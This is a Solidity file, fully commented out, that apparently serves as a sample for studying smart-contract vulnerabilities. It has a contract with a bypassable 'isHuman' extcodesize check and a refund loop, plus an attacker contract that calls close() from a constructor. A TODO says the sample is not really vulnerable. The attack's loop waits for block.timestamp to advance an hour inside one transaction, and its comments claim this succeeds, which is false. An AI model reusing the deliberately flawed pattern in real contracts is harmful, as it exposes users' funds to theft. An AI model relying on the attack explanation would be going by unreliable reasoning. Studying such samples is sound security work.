pragma solidity ^0.8.0;

// SPDX-License-Identifier: GPL-3.0

// TODO This contract must be fixed cause this is not vulnerabile as it is now
// contract C {
//     address[] private buyers;

//     uint public currentKeyPrice = 1;
//     address private lastBuyer;
//     uint private lastBuyTimestamp;

//     // this modifier checks that caller is an EOA, though it can be bypassed by a contract constructor
//     modifier isHuman() {
//         address _addr = msg.sender;
//         uint256 _codeLength;
//         assembly {_codeLength := extcodesize(_addr)}
//         require(_codeLength == 0, "sorry humans only");
//         _;
//     }

//     function buyKey(address refund_address) isHuman() public payable {
//         require(msg.value > currentKeyPrice, "Not enough to buy a key");
//         lastBuyer = msg.sender;
//         lastBuyTimestamp = block.timestamp;
//         currentKeyPrice = buyers.length * 100;

//         for (uint i = 0; i < buyers.length; i++) {
//             (bool success, ) = buyers[i].call{value:1}("");
//             require(success, "Refund failed");
//         }
//         buyers.push(refund_address);
//     }

//     function close() isHuman public {
//         require(block.timestamp > lastBuyTimestamp + 1 hours);
//         (bool success, ) = lastBuyer.call{value: currentKeyPrice * 2}("");
//         require(success, "Call failed");
//     }
// }

// off chain
// Attacker att = new Attacker();
// c.buyKey{value: c.currentKeyPrice() + 1}(address(att));

// contract Attacker {
//     C c;

//     receive() payable external {
//         new Aux();
//     }
// }

// contract Aux {
//     C c;

//     constructor() {
//         uint t = block.timestamp;
//         while (block.timestamp - t < 1 hours) {
//             (bool success, ) = address(c).call(abi.encodeWithSignature("close()"));
//             // this fails for 1 hour, but the txn is not reverted since we ignore the success flag
//         }
//         c.close();  // this will succeed as 1 hour has passed
//     }
// }
